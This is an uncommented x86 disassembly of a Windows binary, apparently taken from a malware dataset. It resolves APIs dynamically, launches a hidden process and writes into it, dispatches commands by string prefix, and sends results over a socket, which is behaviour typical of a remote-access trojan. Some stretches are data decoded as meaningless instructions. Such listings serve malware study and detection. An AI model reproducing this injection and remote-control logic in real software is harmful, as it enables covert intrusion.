mov edx eax
mov eax ebx
call sub_474d58
mov [ esi + 0x5c ] eax
mov eax [ ebp - 0xb8 ]
mov [ esi + 0x58 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x4 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0xc ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0xc ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x10 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x14 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x18 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x1c ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x20 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x24 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x28 ] eax
push 0x60
push 0x0
mov ecx esi
mov edx sub_474e94
mov eax ebx
call sub_474e20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47524d
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
lea edx [ ebp - 0x8 ]
xor eax eax
call sub_40f234
sub_475327
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffffac
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x40 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebx + 0x50 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ ebx + 0x60 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x2c ] eax
mov eax [ ebx + 0x6c ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebx + 0x68 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x30 ] eax
mov eax [ ebx + 0x64 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebx + 0x70 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
call [ ebx ]
push eax
call [ ebx + 0x4 ]
mov [ ebx + 0x24 ] eax
push 0x0
call [ ebx + 0x1c ]
mov eax [ ebx + 0x78 ]
push eax
push 0x0
push 0x0
call [ ebx + 0x34 ]
call [ ebx + 0x10 ]
cmp eax 0xb7
jne r-xdata
push 0x0
call [ ebx + 0x1c ]
mov eax [ ebx + 0x5c ]
push eax
push 0x0
push 0x0
call [ ebx + 0x34 ]
mov edi eax
call [ ebx + 0x10 ]
cmp eax 0xb7
je r-xdata
mov eax [ ebx + 0x7c ]
push eax
push 0x0
push 0x1
call [ ebx + 0x24 ]
mov edi eax
test edi edi
je r-xdata
push edi
call [ ebx + 0x2c ]
push 0x1f4
call [ ebx + 0xc ]
jmp r-xdata
push edi
call [ ebx + 0x2c ]
push esi
push edi
call [ ebx + 0x30 ]
push esi
push edi
call [ ebx + 0x28 ]
push edi
call [ ebx + 0x2c ]
push 0x0
call [ ebx + 0x20 ]
push 0x7d0
call [ ebx + 0xc ]
jmp r-xdata
xor esi esi
mov [ ebp - 0x44 ] 0x44
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x74 ]
push eax
push 0x0
call [ ebx + 0x14 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
or esi 0xffffffff
push 0xc8
mov eax [ ebp - 0x54 ]
push eax
call [ ebx + 0x18 ]
sub eax 0x1
jae r-xdata
jmp r-xdata
sub_4754c4
push ebp
mov ebp esp
add esp 0xffffff20
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
lea esi [ ebp - 0x8c ]
xor eax eax
push ebp
push sub_475829
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xd0 ]
xor ecx ecx
mov edx 0x44
call sub_403af4
mov [ ebp - 0xd0 ] 0x44
mov [ ebp - 0xa4 ] 0x1
mov [ ebp - 0xa0 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_40a26c
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
mov edi r-xdata
lea eax [ ebp - 0xe0 ]
push eax
lea eax [ ebp - 0xd0 ]
push eax
push 0x0
push 0x0
push 0x8000000
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x0
call CreateProcessA
mov ebx [ ebp - 0xe0 ]
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x38 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x3c ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x40 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x44 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x54 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x48 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x4c ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x50 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x60 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x64 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x70 ] eax
mov edx edi
mov eax ebx
call sub_474d58
mov [ esi + 0x78 ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x6c ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x68 ] eax
mov eax [ ebp - 0xc ]
call sub_4059dc
mov edx eax
mov eax ebx
call sub_474d58
mov [ esi + 0x5c ] eax
mov edx r-xdata
mov eax ebx
call sub_474d58
mov [ esi + 0x58 ] eax
mov eax [ ebp - 0x8 ]
call sub_4059dc
mov edx eax
mov eax ebx
call sub_474d58
mov [ esi + 0x74 ] eax
mov eax [ ebp - 0xd8 ]
mov [ esi + 0x7c ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x4 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0xc ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x8 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x2c ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x14 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x10 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x1c ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x34 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x30 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x20 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x28 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x18 ] eax
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ esi + 0x24 ] eax
push 0x80
push 0x0
mov ecx esi
mov edx r-xdata
mov eax ebx
call sub_474e20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475830
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
lea edx [ ebp - 0x8 ]
xor eax eax
call sub_40f234
sub_47595c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
pop ecx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
pop ecx
inc edi
add [ eax ] bl
add [ eax ] al
clc
jg r-xdata
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec eax
add [ eax ] al
add [ eax + edx + 0x4c0040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push eax
add [ eax ] al
add [ eax + edx + 0x540040 ] dl
add [ eax ] al
or dl [ ebp + edx * 2 + 0x70 ]
insb
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add ah dh
pop ecx
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ eax + edx + __dos_stub ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
inc esp
add [ eax ] al
add [ eax + edx + r-xdata ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
dec esp
add [ eax ] al
add [ eax + edx + 0x500040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
push esp
add [ eax ] al
add [ edx ] cl
push esp
push ebp
jo r-xdata
outsd
popad
inc esi
push esp
push eax
lea eax [ eax ]
mov edx [ eax + 0x50 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov edx [ eax + 0x40 ]
push edx
mov ecx [ eax + 0x4c ]
mov edx [ eax + 0x48 ]
mov eax [ eax + 0x54 ]
call sub_473358
retn
sub_475a10
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475a51
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x44 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475a58
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_475a5c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475a9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x48 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475aa4
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_475aa8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475ae9
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x54 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475af0
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_475af4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475b35
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x4c ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475b3c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_475b40
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475b81
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x50 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475b88
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_475b8c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475bcd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x40 ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475bd4
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_475bd8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
xor eax eax
push ebp
push sub_475d76
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_475d47
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax r-xdata
call sub_483f50
test eax eax
jg r-xdata
mov eax r-xdata
call sub_483f50
call sub_484388
jmp r-xdata
mov eax r-xdata
call sub_483f50
test eax eax
jg r-xdata
mov eax r-xdata
call sub_483f50
call sub_484388
lea edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax r-xdata
call sub_4735e8
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax r-xdata
call sub_4735e8
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax r-xdata
call sub_46ff10
xor eax eax
push ebp
push sub_475cec
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
call sub_471a2c
xor eax eax
call sub_471b6c
call sub_4724fc
call sub_4725ec
call sub_4726dc
call sub_4727cc
mov eax 0x1
call sub_471edc
mov eax 0x1
call sub_47204c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4853d8
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
call sub_473b6c
test al al
jne r-xdata
mov eax 0x12
call sub_48a070
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call closesocket
call GetCurrentProcessId
call sub_484388
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x14 ]
xor eax eax
call sub_40f234
mov edx [ ebp - 0x14 ]
mov eax r-xdata
call sub_474f80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475d7d
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_405554
retn
sub_475e2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475ebd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4613d8
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov esi eax
push 0x0
push esi
lea eax [ ebp - 0x4 ]
call j_sub_4059f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call send
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475ec4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub eax 0x4
mov eax [ eax ]
sub_475ecc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475f58
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_4613d8
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4055c8
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
push 0x0
push ebx
lea eax [ ebp - 0x4 ]
call j_sub_4059f0
push eax
push esi
call send
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475f5f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub eax 0x4
mov eax [ eax ]
sub_475f68
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_475fca
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4055c8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
push 0x0
push ebx
lea eax [ ebp - 0x4 ]
call j_sub_4059f0
push eax
push esi
call send
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_475fd1
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub eax 0x4
mov eax [ eax ]
sub_475fd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp - 0xc ]
call sub_4059cc
xor eax eax
push ebp
push sub_47608a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x14
push 0x40
call LocalAlloc
mov esi eax
mov ebx esi
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_405584
lea eax [ ebx + 0x4 ]
call sub_405530
lea eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_405584
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0xc ]
call sub_405584
lea eax [ ebx + 0x10 ]
mov edx r-xdata
call sub_405584
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
push eax
push 0x0
push esi
push sub_48317c
push 0x0
push 0x0
call CreateThread
push eax
call CloseHandle
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476091
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
sub_4760a4
push ebp
mov ebp esp
mov ecx 0xed
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_4059cc
lea eax [ ebp - 0x198 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_47d27b
push [ fs : eax ]
mov [ fs : eax ] esp
xor ecx ecx
push ebp
push sub_47d13e
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x200 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x200 ]
mov edx r-xdata
call sub_405974
jne r-xdata
mov eax r-xdata
call sub_475e2c
lea eax [ ebp - 0x204 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x204 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_48b42c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x208 ]
push eax
mov ecx 0x6
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x208 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
mov eax [ ebp - 0x8 ]
call sub_409edc
call sub_488d04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d285
lea eax [ ebp - 0x76c ]
mov edx 0x28
call sub_405554
lea eax [ ebp - 0x6cc ]
call sub_40700c
lea eax [ ebp - 0x6c8 ]
mov edx 0x3b
call sub_405554
lea eax [ ebp - 0x5dc ]
mov edx 0x51
call sub_405554
lea eax [ ebp - 0x498 ]
call sub_40700c
lea eax [ ebp - 0x494 ]
call sub_405d28
lea eax [ ebp - 0x490 ]
call sub_40700c
lea eax [ ebp - 0x48c ]
call sub_405d28
lea eax [ ebp - 0x488 ]
call sub_40700c
lea eax [ ebp - 0x484 ]
call sub_405d28
lea eax [ ebp - 0x480 ]
call sub_40700c
lea eax [ ebp - 0x47c ]
call sub_405d28
lea eax [ ebp - 0x478 ]
call sub_40700c
lea eax [ ebp - 0x474 ]
call sub_405d28
lea eax [ ebp - 0x470 ]
mov edx [ r-xdata ]
mov ecx 0x5
call sub_4060f8
lea eax [ ebp - 0x45c ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x44c ]
mov edx 0x33
call sub_405554
lea eax [ ebp - 0x378 ]
mov edx 0x31
call sub_405554
lea eax [ ebp - 0x2b4 ]
mov edx 0x2e
call sub_405554
lea eax [ ebp - 0x198 ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0x38 ]
call sub_411650
lea eax [ ebp - 0x28 ]
mov edx 0x9
call sub_405554
retn
lea eax [ ebp - 0x248 ]
push eax
mov ecx 0xa
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x248 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x6
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0xc ]
push eax
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov edx [ ebp - 0x8 ]
mov eax r-xdata
call sub_405b28
mov ecx eax
lea eax [ ebp - 0x8 ]
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4055c8
mov eax [ rw-data ]
mov edx [ ebp - 0xc ]
call sub_405584
lea eax [ ebp - 0x1c ]
call sub_48cf38
movzx eax [ r-xdata ]
push eax
lea eax [ ebp - 0x20c ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x1c ]
call sub_40ef44
mov edx [ ebp - 0x20c ]
lea eax [ ebp - 0x1c ]
call sub_4055c8
call sub_48d0a4
test al al
je r-xdata
lea eax [ ebp - 0x260 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x260 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0xa
mov edx 0x1
call sub_405a84
lea eax [ ebp - 0x24c ]
call sub_48cfb4
cmp [ ebp - 0x24c ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x264 ]
push eax
mov ecx 0x9
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_405a44
mov eax [ ebp - 0x264 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x3
mov edx 0x1
call sub_405a84
push 0x40
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push 0x0
call MessageBoxA
lea eax [ ebp - 0xc ]
call sub_405530
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x18 ]
call sub_405530
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x210 ]
call sub_48cfb4
cmp [ ebp - 0x210 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x8 ]
mov ecx 0x9
mov edx 0x1
call sub_405a84
push 0x5
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push 0x0
call ShellExecuteA
push r-xdata
mov eax [ rw-data ]
push [ eax ]
push r-xdata
push [ ebp - 0x8 ]
push r-xdata
call sub_48a114
xor edx edx
push edx
push eax
lea eax [ ebp - 0x254 ]
call sub_409e5c
push [ ebp - 0x254 ]
push r-xdata
push r-xdata
push [ ebp - 0xc ]
push r-xdata
lea eax [ ebp - 0x258 ]
call sub_48dd0c
push [ ebp - 0x258 ]
push r-xdata
lea eax [ ebp - 0x25c ]
call sub_48cf38
push [ ebp - 0x25c ]
lea eax [ ebp - 0x250 ]
mov edx 0xd
call sub_4058e0
mov eax [ ebp - 0x250 ]
call sub_475e2c
push r-xdata
mov eax [ rw-data ]
push [ eax ]
push r-xdata
push [ ebp - 0xc ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x218 ]
call sub_460a58
push [ ebp - 0x218 ]
push r-xdata
lea edx [ ebp - 0x21c ]
mov eax [ rw-data ]
movzx eax [ eax ]
call sub_409d70
push [ ebp - 0x21c ]
push r-xdata
lea eax [ ebp - 0x220 ]
call sub_48ceb0
push [ ebp - 0x220 ]
push r-xdata
lea eax [ ebp - 0x224 ]
call sub_48ce74
push [ ebp - 0x224 ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
call sub_48a114
xor edx edx
push edx
push eax
lea eax [ ebp - 0x228 ]
call sub_409e5c
push [ ebp - 0x228 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x22c ]
call sub_48d3c4
push [ ebp - 0x22c ]
push [ ebp - 0x14 ]
push r-xdata
lea eax [ ebp - 0x234 ]
call sub_48d704
mov eax [ ebp - 0x234 ]
lea edx [ ebp - 0x230 ]
call sub_40a5a0
push [ ebp - 0x230 ]
push r-xdata
push r-xdata
lea eax [ ebp - 0x238 ]
call sub_48b908
push [ ebp - 0x238 ]
push r-xdata
push [ ebp - 0x18 ]
push r-xdata
lea eax [ ebp - 0x23c ]
call sub_48ceec
push [ ebp - 0x23c ]
push r-xdata
push [ ebp - 0x1c ]
push r-xdata
mov eax [ rw-data ]
push [ eax ]
push r-xdata
lea eax [ ebp - 0x240 ]
call sub_48dd0c
push [ ebp - 0x240 ]
push r-xdata
lea eax [ ebp - 0x244 ]
call sub_48dc30
push [ ebp - 0x244 ]
push r-xdata
mov eax [ rw-data ]
push [ eax ]
push r-xdata
mov eax [ rw-data ]
push [ eax ]
lea eax [ ebp - 0x214 ]
mov edx 0x2a
call sub_4058e0
mov eax [ ebp - 0x214 ]
call sub_475e2c
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_405974
jne r-xdata
lea eax [ ebp - 0x26c ]
call sub_46d854
mov ecx [ ebp - 0x26c ]
lea eax [ ebp - 0x268 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x268 ]
